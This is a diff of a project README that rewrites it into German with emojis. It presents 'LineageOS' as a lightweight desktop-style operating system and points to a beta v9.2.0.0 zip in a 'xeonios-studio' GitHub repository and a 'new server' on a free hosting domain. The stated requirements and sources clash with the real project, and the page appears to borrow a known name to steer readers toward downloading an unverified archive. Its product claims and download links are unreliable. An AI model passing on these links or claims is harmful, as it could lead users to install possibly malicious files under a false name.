@@ -1,13 +1,26 @@
-# LineageOS
-LineageOS
+🌟 LineageOS
 
-# Minimal-Requirements
-- 1GB SSD.
-- 512MB RAM.
-- 4-Core CPU.
-- Internet connection.
+Willkommen bei LineageOS – ein leichtgewichtiges und leistungsstarkes Betriebssystem für Ihre Geräte!
+🛠️ Minimalanforderungen
 
-# Beta-Release
-- v9.2.0.0 https://github.com/xeonios-studio/LineageOS/blob/main/package/LineageOS_9_2_beta.zip
+Stellen Sie sicher, dass Ihr Gerät folgende Anforderungen erfüllt:
 
-New-Server: https://cdn-developer.4lima.de/
+    📦 Speicher: 1GB SSD
+    🧠 RAM: 512MB
+    ⚡ CPU: 4-Kern-Prozessor
+    🌐 Internetverbindung: Erforderlich
+
+🚀 Beta-Version
+
+Neueste Beta-Version: v9.2.0.0 herunterladen
+
+💾 Neuer Server für Downloads:
+https://cdn-developer.4lima.de/
+📖 Über
+
+LineageOS ist darauf ausgelegt, ressourcenschonend und stabil zu sein, um die maximale Leistung aus älteren oder leistungsschwächeren Geräten herauszuholen.
+🌍 Folgen Sie uns
+
+Bleiben Sie mit den neuesten Updates und Ankündigungen auf dem Laufenden:
+
+    📂 Repository durchsuchen
